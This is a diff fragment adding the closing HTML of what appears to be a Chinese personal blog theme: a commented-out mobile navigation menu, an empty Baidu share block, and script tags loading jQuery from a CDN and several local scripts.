+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
